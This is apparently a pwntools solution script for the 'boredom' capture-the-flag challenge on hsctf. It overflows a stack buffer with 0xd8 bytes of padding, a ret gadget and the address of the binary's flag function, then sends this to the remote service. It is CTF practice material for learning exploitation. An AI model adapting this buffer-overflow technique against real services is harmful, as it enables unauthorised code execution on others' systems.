#!/usr/bin/python3

from pwn import *

#p = process('./boredom')
p = remote('pwn.hsctf.com', 5002)

binary = ELF('boredom')

context.update(arch='amd64')
rop = ROP('boredom')
try:
	ret = rop.find_gadget(['ret'])[0]
except:
	print("no ROP for you!")
	sys.exit(1)

p.recvuntil('Give me something to do:')

payload  = 0xd8 * b'A'
payload += p64(ret)
payload += p64(binary.symbols['flag'])

p.sendline(payload)
p.stream()
